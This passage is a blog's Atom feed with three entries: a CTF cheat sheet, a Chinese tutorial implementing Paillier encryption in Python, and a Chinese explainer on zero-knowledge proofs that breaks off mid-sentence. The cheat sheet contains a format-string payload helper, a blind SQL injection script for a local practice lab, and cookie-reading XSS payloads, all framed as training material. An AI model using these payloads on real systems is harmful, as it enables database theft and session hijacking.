<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>AssassinQ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://qianfei11.github.io/"/>
  <updated>2019-09-09T02:42:57.753Z</updated>
  <id>https://qianfei11.github.io/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF CHEAT SHEET by AssassinQ</title>
    <link href="https://qianfei11.github.io/9999/12/31/CTF-CHEAT-SHEET-by-AssassinQ/"/>
    <id>https://qianfei11.github.io/9999/12/31/CTF-CHEAT-SHEET-by-AssassinQ/</id>
    <published>9999-12-31T15:59:59.000Z</published>
    <updated>2019-09-09T02:42:57.753Z</updated>
    
    <content type="html"><![CDATA[<p>Some tips.</p><a id="more"></a><h1 id="BASIC"><a href="#BASIC" class="headerlink" title="BASIC"></a>BASIC</h1><h2 id="ZSH-Config"><a href="#ZSH-Config" class="headerlink" title="ZSH Config"></a>ZSH Config</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install curl git zsh</span><br><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><h2 id="Start-a-local-server-via-ncat"><a href="#Start-a-local-server-via-ncat" class="headerlink" title="Start a local server via ncat"></a>Start a local server via ncat</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./vul -kl 127.0.0.1 8888</span><br></pre></td></tr></table></figure><h2 id="Install-pwntools"><a href="#Install-pwntools" class="headerlink" title="Install pwntools"></a>Install pwntools</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo pip install --upgrade pip</span><br><span class="line">sudo pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><h2 id="Install-GDB-plugins"><a href="#Install-GDB-plugins" class="headerlink" title="Install GDB plugins"></a>Install GDB plugins</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/peda.git ~/peda</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/scwuaptx/Pwngdb.git ~/Pwngdb</span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(offset, addr, val)</span>:</span></span><br><span class="line">payload = <span class="string">''</span>.join(p32(addr + i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>))</span><br><span class="line">printed = len(payload)</span><br><span class="line">fmt1 = <span class="string">'%&#123;&#125;c'</span></span><br><span class="line">fmt2 = <span class="string">'%&#123;&#125;$hhn'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">byte = (val &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">addition = (byte - printed + <span class="number">256</span>) % <span class="number">256</span></span><br><span class="line"><span class="keyword">if</span> addition &gt; <span class="number">0</span>:</span><br><span class="line">payload += fmt1.format(str(addition))</span><br><span class="line">payload += fmt2.format(str(offset + i))</span><br><span class="line">printed += addition</span><br><span class="line"><span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="SQL-Injection-script"><a href="#SQL-Injection-script" class="headerlink" title="SQL Injection script"></a>SQL Injection script</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">""</span> <span class="comment"># "http://127.0.0.1/sqli-labs-master/less-5/index.php?id="</span></span><br><span class="line">payload = <span class="string">"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_databse</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr(database(),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Database: "</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Table names: "</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Column names: "</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> payload:</span><br><span class="line">            sql = <span class="string">""</span> <span class="comment"># "1' and substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'%23".format(i, ch)</span></span><br><span class="line">            r = requests.get(url + sql)</span><br><span class="line">            <span class="keyword">if</span>(len(r.text) == <span class="number">704</span>):</span><br><span class="line">                res += ch</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"Flag: "</span>, res)</span><br></pre></td></tr></table></figure><h2 id="XSS-payloads"><a href="#XSS-payloads" class="headerlink" title="XSS payloads"></a>XSS payloads</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie);&lt;/script&gt;</span><br><span class="line">&lt;ScRipT&gt;alert(<span class="built_in">document</span>.cookie);&lt;/ScRipT&gt;</span><br><span class="line">&lt;img src=xss onerror=alert(<span class="built_in">document</span>.cookie)&gt;</span><br><span class="line">&lt;<span class="keyword">var</span> onmouseover=<span class="string">"prompt(1)"</span>&gt;On Mouse Over&lt;<span class="regexp">/var&gt;</span></span><br><span class="line"><span class="regexp">&lt;video src=1 onerror=alert(document.cookie)&gt;</span></span><br><span class="line"><span class="regexp">...</span></span><br></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="Substitution-ciphers"><a href="#Substitution-ciphers" class="headerlink" title="Substitution ciphers"></a>Substitution ciphers</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rahash2 -E rot -S s:14 -s <span class="string">'oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;\n'</span></span><br></pre></td></tr></table></figure><h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = ARC4.new(key)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">obj = ARC4.new(key)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'Assassin'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = DES.new(key, DES.MODE_ECB)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ_______'</span></span><br><span class="line">iv = <span class="string">'AssassinQ_______'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">obj = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><h2 id="Blowfish"><a href="#Blowfish" class="headerlink" title="Blowfish"></a>Blowfish</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = Blowfish.new(key, Blowfish.MODE_ECB)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><h2 id="RC2"><a href="#RC2" class="headerlink" title="RC2"></a>RC2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC2</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ_______'</span></span><br><span class="line">iv = <span class="string">'Assassin'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = ARC2.new(key, ARC2.MODE_CFB, iv)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line">obj = ARC2.new(key, ARC2.MODE_CFB, iv)</span><br><span class="line">plain = obj.decrypt(enc)</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><h2 id="CAST-128"><a href="#CAST-128" class="headerlink" title="CAST-128"></a>CAST-128</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> CAST</span><br><span class="line"></span><br><span class="line">key = <span class="string">'AssassinQ_______'</span></span><br><span class="line">iv = <span class="string">'Assassin'</span></span><br><span class="line">flag = <span class="string">'flag&#123;teeeeeeest&#125;'</span></span><br><span class="line">obj = CAST.new(key, CAST.MODE_OPENPGP, iv)</span><br><span class="line">enc = obj.encrypt(flag)</span><br><span class="line"><span class="keyword">print</span> list(enc)</span><br><span class="line"></span><br><span class="line">eiv = enc[:CAST.block_size + <span class="number">2</span>]</span><br><span class="line">obj = CAST.new(key, CAST.MODE_OPENPGP, eiv)</span><br><span class="line">plain = obj.decrypt(enc[CAST.block_size + <span class="number">2</span>:])</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Some tips.&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Python实现Paillier加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/10/24/Python%E5%AE%9E%E7%8E%B0Paillier%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/10/24/Python实现Paillier加密解密算法/</id>
    <published>2019-10-24T03:49:26.000Z</published>
    <updated>2019-10-25T04:45:31.493Z</updated>
    
    <content type="html"><![CDATA[<p>Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。</p><a id="more"></a><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="Keygen"><a href="#Keygen" class="headerlink" title="Keygen"></a>Keygen</h2><p>首先选择两个大素数 $p$ 和 $q$，计算出 $n$ 为 $p$ 和 $q$ 的乘积。并取一个随机数 $g$（通常取 $n+1$）。$n$ 和 $g$ 作为公钥。</p><p>然后根据卡迈克尔函数计算私钥 $\lambda$ 为 $p-1$ 和 $q-1$ 的乘积。</p><h2 id="Encipher"><a href="#Encipher" class="headerlink" title="Encipher"></a>Encipher</h2><p>加密时取一个随机数 $r$，计算出 $c=g^m r^n(mod\ n^2)$。</p><h2 id="Decipher"><a href="#Decipher" class="headerlink" title="Decipher"></a>Decipher</h2><p>解密有一点复杂。首先我们可以得到：</p><p>$$<br>c^\lambda=(g^m r^n)^\lambda=g^{m \lambda} r^{n \lambda}(mod\ n^2)<br>$$</p><p>根据卡迈克尔函数，即对于任何 $\omega \in Z^*_{n^2}$，必定存在以下结论：</p><p>$$<br>\omega^{n \lambda}=1(mod\ n^2)<br>$$</p><p>那么可以得到 $c^\lambda=g^{m \lambda}(mod\ n^2)$。</p><p>然后看看生成元 $g$，实际上是通过 $g=(1+\alpha n)\beta^n$，并且 $\alpha,\beta \in Z^*_n$。由此可得：</p><p>$$<br>c^\lambda=(1+\alpha n)^{m \lambda}\beta^{n m \lambda}=(1+\alpha n)^{m \lambda}(mod\ n^2)<br>$$</p><p>再根据公式 $(1+n)^x=1+xn(mod\ n^2)$，可以得到：</p><p>$$<br>c^\lambda=(1+n)^{\alpha m \lambda}=1+n \alpha m \lambda(mod\ n^2)<br>$$</p><p>然后我们在此处定义一个函数 $L(x)=\frac{x-1}{n}$，则 $L(c^\lambda)=\alpha m \lambda$。</p><p>那么我们可以得到明文的计算公式为 $m=\frac{L(c^\lambda)}{L(g^\lambda)}=\frac{\alpha m \lambda}{\alpha \lambda}=m(mod\ n)$。</p><h1 id="Getting-started"><a href="#Getting-started" class="headerlink" title="Getting started"></a>Getting started</h1><p>通过 gmpy2 和 libnum 库实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span><span class="params">(rs)</span>:</span></span><br><span class="line">    p = gmpy2.mpz_urandomb(rs, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> gmpy2.is_prime(p):</span><br><span class="line">        p = p + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(x, n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (x - <span class="number">1</span>) / n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span><span class="params">()</span>:</span></span><br><span class="line">    rs = gmpy2.random_state(int(time.time()))</span><br><span class="line">    p = get_prime(rs)</span><br><span class="line">    q = get_prime(rs)</span><br><span class="line">    n = p * q</span><br><span class="line">    lmd = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#g = random.randint(1, n ** 2)</span></span><br><span class="line">    g = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[!] g is not good enough'</span></span><br><span class="line">        exit()</span><br><span class="line">    pk = [n, g]</span><br><span class="line">    sk = lmd</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encipher</span><span class="params">(plaintext, pk)</span>:</span></span><br><span class="line">    m = libnum.s2n(plaintext)</span><br><span class="line">    n, g = pk</span><br><span class="line">    r = random.randint(<span class="number">1</span>, n ** <span class="number">2</span>)</span><br><span class="line">    c = gmpy2.powmod(g, m, n ** <span class="number">2</span>) * gmpy2.powmod(r, n, n ** <span class="number">2</span>) % (n ** <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decipher</span><span class="params">(c, pk, sk)</span>:</span></span><br><span class="line">    [n, g] = pk</span><br><span class="line">    lmd = sk</span><br><span class="line">    u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** <span class="number">2</span>), n), n) % n</span><br><span class="line">    m = L(gmpy2.powmod(c, lmd, n ** <span class="number">2</span>), n) * u % n</span><br><span class="line">    plaintext = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pk, sk = keygen()</span><br><span class="line">    <span class="comment">#print 'pk:', pk</span></span><br><span class="line">    <span class="comment">#print 'sk:', sk</span></span><br><span class="line">    plaintext = raw_input(<span class="string">'Please input your message: '</span>)</span><br><span class="line">    ciphertext = encipher(plaintext, pk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Ciphertext:'</span>, ciphertext</span><br><span class="line">    plaintext = decipher(ciphertext, pk, sk)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Plaintext:'</span>, plaintext</span><br></pre></td></tr></table></figure><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://security.hsr.ch/msevote/docs/Paillier_Cryptosystem.pdf" target="_blank" rel="noopener">The Paillier Cryptosystem</a><br><a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E9%82%81%E5%85%8B%E7%88%BE%E5%87%BD%E6%95%B8" target="_blank" rel="noopener">卡迈克尔函数</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Paillier 加密系统，是 1999 年 Paillier 发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。&lt;/p&gt;
    
    </summary>
    
    
      <category term="crypto" scheme="https://qianfei11.github.io/tags/crypto/"/>
    
      <category term="python" scheme="https://qianfei11.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>何为零知识证明</title>
    <link href="https://qianfei11.github.io/2019/09/29/%E4%BD%95%E4%B8%BA%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E/"/>
    <id>https://qianfei11.github.io/2019/09/29/何为零知识证明/</id>
    <published>2019-09-29T11:28:12.000Z</published>
    <updated>2019-10-04T10:33:07.438Z</updated>
    
    <content type="html"><![CDATA[<p>何为<a href="https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E" target="_blank" rel="noopener">零知识证明</a>？</p><a id="more"></a><p>零知识证明，指的是示证者向验证者表明他知道某种秘密，不仅能使验证者完全确信他的确知道这个秘密，同时还保证一丁点秘密也不泄露给验证者。</p><h1 id="童话里的零知识证明"><a href="#童话里的零知识证明" class="headerlink" title="童话里的零知识证明"></a>童话里的零知识证明</h1><p>举个最简单的阿拉伯童话《一千零一夜》里的零知识证明：阿里巴巴与四十大盗的故事其中一个片段。</p><p>阿里巴巴会芝麻开门的咒语，强盗向他拷问打开山洞石门的咒语，他不想让人听到咒语，便对强盗说：「你们离我一箭之地，用弓箭指着我，你们举起右手，我念咒语打开石门，举起左手，我念咒语关上石门，如果我做不到或逃跑，你们就用弓箭射死我。」</p><p>这个方案对阿里巴巴没损失，也能帮助他们搞清楚阿里巴巴到底是否知道咒语，于是强盗们同意。强盗举起了右手，只见阿里巴巴的嘴动了几下，石门打开了；强盗举起了左手，阿里巴巴的嘴动了几下，石门又关上了。强盗有点不信，没准这是巧合，多试几次过后，他们相信了阿里巴巴。</p><h1 id="零知识证明的优点"><a href="#零知识证明的优点" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ul><li>在使用零知识证明的时候，不降低安全性。</li><li>零知识证明工作高效，计算过程量小，双方交换信息少。</li><li>既安全、又有良好的隐私、又减少计算量。</li></ul><h1 id="零知识证明的性质"><a href="#零知识证明的性质" class="headerlink" title="零知识证明的性质"></a>零知识证明的性质</h1><p>根据零知识证明的定义和有关例子，可以得出零知识证明具有以下三个性质：</p><ol><li>完备性（completeness）：如果证明方和验证方都是诚实的，并遵循证明过程的每一步，进行正确的计算，那么这个证明一定是成功的，验证方一定能够接受证明方。</li><li>合理性（soundness）：没有人能够假冒证明方，使这个证明成功。</li><li>零知识性（zero-knowledge）：证明过程执行完之后，验证方只获得了「证明方拥有这个知识」的信息，而没有获得关于这个知识本身的任何信息。</li></ol><h1 id="零知识证明的优点-1"><a href="#零知识证明的优点-1" class="headerlink" title="零知识证明的优点"></a>零知识证明的优点</h1><ol><li>随着零知识证明的使用，安全性不会降级，因为该证明具有零知识性质。</li><li>高效性。该过程计算量小，双方交换的信息量少。</li><li>安全性依赖于未解决的数学难题，如离散对数、大整数因子分解、平方根等。</li><li>许多零知识证明相关的技术避免了直接使用有政府限制的加密算法，为相关产品的出口带去优势。</li></ol><h1 id="证明举例"><a href="#证明举例" class="headerlink" title="证明举例"></a>证明举例</h1><p>例 1：A 要向 B 证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。有两个方法：</p><ol><li>A 把钥匙出示给 B，B 用这把钥匙打开该房间的锁，从而证明 A 拥有该房间的正确的钥匙。</li><li>B 确定该房间内有某一物体，A 用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给 